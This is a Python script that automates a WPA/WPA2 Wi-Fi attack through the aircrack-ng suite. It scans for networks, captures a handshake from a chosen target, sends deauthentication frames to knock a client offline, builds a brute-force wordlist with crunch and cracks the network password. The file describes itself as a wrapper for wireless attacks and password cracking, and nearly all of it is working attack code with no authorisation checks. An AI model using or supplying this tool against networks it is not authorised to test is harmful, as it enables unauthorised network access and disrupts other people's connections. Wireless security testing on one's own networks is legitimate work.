import subprocess
import os
import time
import logging
import argparse
from pathlib import Path
import csv

# Setup logging with dynamic verbosity
def setup_logging(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

# Run commands with error handling and verbosity support
class CommandRunner:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def run(self, cmd, timeout=None, shell=False):
        if self.verbose:
            logging.debug(f"Running command: {' '.join(cmd)}")
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=shell)
        except subprocess.TimeoutExpired:
            logging.error(f"Command timed out: {' '.join(cmd)}")
        except (FileNotFoundError, OSError) as e:
            logging.error(f"Command failed: {e}")
        return None

    def check(self, result, success_message=None, failure_message=None):
        if result and result.returncode == 0:
            if success_message:
                logging.info(success_message)
            return True
        else:
            if failure_message:
                logging.error(failure_message)
            return False

# Wrapper-class with wireless attacks and password cracking
class AircrackNGWrapper:
    
    def __init__(self, runner: CommandRunner):
        self.runner = runner
        self.interface = None
        self.wordlist_path = None
        self.bssid = None
        self.channel = None
        self.capture_file = None
        self.client_bssid = None
        self.handshake_timeout = 120  # Timeout in seconds for handshake capture

    def configure(self, args):
        self.interface = args.interface or self.select_option("Select the interface to use", self.get_interfaces())
        if not self.interface:
            logging.error("No valid interface selected. Exiting.")
            exit(1)
        self.bssid = args.bssid
        self.channel = args.channel
        self.capture_file = args.capture_file or "capture"
        self.client_bssid = args.client_bssid

        # Wordlist configuration
        if args.crunch:
            self.generate_wordlist_with_crunch()
        else:
            self.wordlist_path = args.wordlist or self.get_input("Enter the path to your existing wordlist file")

        # Validate file paths
        self.validate_paths()

    def validate_paths(self):
        if self.wordlist_path and not Path(self.wordlist_path).is_file():
            logging.error(f"Wordlist file '{self.wordlist_path}' does not exist.")
            exit(1)

    def get_interfaces(self):
        result = self.runner.run(['iwconfig'])
        if result:
            return [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line or "wlan" in line]
        return []

    def select_option(self, prompt, options):
        print(f"{prompt}:")
        for idx, option in enumerate(options):
            print(f"{idx + 1}: {option}")
        choice = int(self.get_input(f"Select an option (1-{len(options)}): ")) - 1
        return options[choice] if 0 <= choice < len(options) else None

    def get_input(self, prompt, default=None):
        user_input = input(f"{prompt} [{default}]: ") or default
        return user_input

    def start_monitor_mode(self):
        logging.info(f"Starting monitor mode on {self.interface}...")
        result = self.runner.run(['sudo', 'airmon-ng', 'start', self.interface])
        if not self.runner.check(result, "Monitor mode started", "Failed to start monitor mode"):
            exit(1)
        self.interface += 'mon'

    def stop_monitor_mode(self):
        logging.info(f"Stopping monitor mode on {self.interface}...")
        result = self.runner.run(['sudo', 'airmon-ng', 'stop', self.interface])
        self.runner.check(result, "Monitor mode stopped", "Failed to stop monitor mode")

    def verify_monitor_mode(self):
        result = self.runner.run(['iwconfig'])
        if result and (f"{self.interface}mon" in result.stdout or "Mode:Monitor" in result.stdout):
            if not "mon" in self.interface:
                self.interface += 'mon'
            return True
        return False

    def list_networks(self):
        logging.info("Scanning for networks...")
        cmd = ['sudo', 'airodump-ng', '--band', 'g', '--output-format', 'csv', '--write', 'temp_scan', self.interface]
        result = self.runner.run(cmd, timeout=60)  # Increased timeout for scanning
        if result and result.returncode == 0:
            networks = self.parse_networks_from_csv('temp_scan-01.csv')
            if networks:
                self.bssid = self.select_network(networks)
                self.channel = self.get_input("Enter the channel of the target network")
            else:
                logging.error("No networks found. Ensure your wireless interface is in monitor mode.")
                exit(1)
        else:
            logging.error("Failed to scan for networks. Check if your wireless interface is in monitor mode and if airodump-ng is installed correctly.")
            exit(1)

    def parse_networks_from_csv(self, csv_file):
        networks = []
        try:
            with open(csv_file, 'r') as f:
                reader = csv.reader(f)
                for row in reader:
                    if row and len(row) > 0:
                        # Assuming BSSID is in the first column and ESSID is in the second
                        bssid = row[0]
                        essid = row[1]
                        networks.append((bssid, essid))
        except FileNotFoundError:
            logging.error(f"CSV file {csv_file} not found.")
        return networks

    def select_network(self, networks):
        print("Available networks:")
        for idx, (bssid, essid) in enumerate(networks):
            print(f"{idx + 1}: {bssid} ({essid})")
        choice = int(self.get_input(f"Select a network (1-{len(networks)}): ")) - 1
        selected_bssid = networks[choice][0] if 0 <= choice < len(networks) else None
        return selected_bssid

    def capture_handshake(self):
        if not self.bssid or not self.channel:
            logging.error("BSSID or channel not set. Cannot capture handshake.")
            exit(1)
        cmd = self.build_airodump_cmd()
        logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        success = self.wait_for_handshake(process)
        if not success:
            logging.error("Handshake capture failed.")
            exit(1)

    def wait_for_handshake(self, process):
        start_time = time.time()
        while time.time() - start_time < self.handshake_timeout:
            if os.path.exists(f"{self.capture_file}-01.cap") and self.is_handshake_captured():
                logging.info("Handshake captured!")
                process.terminate()
                return True
            time.sleep(5)
        process.terminate()
        logging.error("Handshake not captured within the timeout period.")
        return False

    def is_handshake_captured(self):
        result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
        return result and "1 handshake" in result.stdout

    def deauth_client(self):
        if not self.client_bssid:
            return  # Deauth attack is optional
        
        logging.info(f"Attempting deauth attack on {self.client_bssid}...")
        result = self.runner.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', self.bssid, '-c', self.client_bssid, self.interface])
        if not self.runner.check(result, "Deauth attack successful", "Deauth attack failed"):
            exit(1)

    def generate_wordlist_with_crunch(self):
        output_file = self.get_input("Enter the output filename for crunch wordlist", "crunch_wordlist.txt")
        cmd = ['crunch', '8', '16', '-o', output_file]
        logging.info(f"Generating wordlist with crunch...")
        result = self.runner.run(cmd)
        if self.runner.check(result, "Wordlist generated successfully", "Failed to generate wordlist"):
            self.wordlist_path = output_file

    def build_airodump_cmd(self):
        return ['sudo', 'airodump-ng', '-c', self.channel, '--bssid', self.bssid, '--write', self.capture_file, self.interface]

    def crack_password(self):
        if not os.path.exists(f"{self.capture_file}-01.cap"):
            logging.error(f"Capture file '{self.capture_file}-01.cap' does not exist.")
            exit(1)

        cmd = ['sudo', 'aircrack-ng', '-w', self.wordlist_path, f"{self.capture_file}-01.cap"]
        logging.info(f"Starting password crack with wordlist '{self.wordlist_path}'...")
        result = self.runner.run(cmd)
        if result and result.returncode == 0:
            logging.info("Password cracking completed. Check the output for results.")
        else:
            logging.error("Password cracking failed.")
            exit(1)

def main():
    parser = argparse.ArgumentParser(description="Aircrack-ng wrapper script")
    parser.add_argument('-i', '--interface', help="Wireless interface to use")
    parser.add_argument('-b', '--bssid', help="BSSID of the target network")
    parser.add_argument('-c', '--channel', help="Channel of the target network")
    parser.add_argument('-w', '--wordlist', help="Path to existing wordlist file")
    parser.add_argument('--crunch', action='store_true', help="Generate wordlist with crunch")
    parser.add_argument('-a', '--client-bssid', help="BSSID of the client to deauth")
    parser.add_argument('-f', '--capture-file', help="Capture file prefix")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output")
    args = parser.parse_args()

    setup_logging(args.verbose)
    runner = CommandRunner(verbose=args.verbose)
    aircrack_wrapper = AircrackNGWrapper(runner)

    aircrack_wrapper.configure(args)
    aircrack_wrapper.start_monitor_mode()
    if not aircrack_wrapper.verify_monitor_mode():
        logging.error("Interface is not in monitor mode. Exiting.")
        exit(1)

    aircrack_wrapper.list_networks()
    aircrack_wrapper.capture_handshake()
    aircrack_wrapper.deauth_client()
    aircrack_wrapper.crack_password()
    aircrack_wrapper.stop_monitor_mode()

if __name__ == "__main__":
    main()
